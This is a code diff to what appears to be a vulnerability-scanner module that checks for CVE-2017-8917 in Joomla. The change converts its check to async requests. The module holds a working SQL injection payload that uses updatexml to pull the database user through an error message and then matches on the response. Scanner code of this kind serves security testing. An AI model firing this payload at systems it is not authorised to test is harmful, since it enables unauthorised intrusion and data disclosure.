@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class CVE_2017_8917_BaseVerify:
     def __init__(self, url):
@@ -21,7 +21,7 @@ class CVE_2017_8917_BaseVerify:
         }
         self.payload = '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)'
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -32,17 +32,14 @@ class CVE_2017_8917_BaseVerify:
         """
         
         try:
-            check_req = request.get(self.url + self.payload, headers = self.headers)
-            if 'XPATH syntax error:' in check_req.text:
+            check_req = await request.get(self.url + self.payload, headers = self.headers)
+            if 'XPATH syntax error:' in await check_req.text():
                 pattern = re.compile('<span class="label label-inverse">500</span>(.*?)</blockquote>')
-                cmd_result = pattern.findall(check_req.text)[0]
+                cmd_result = pattern.findall(await check_req.text())[0]
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
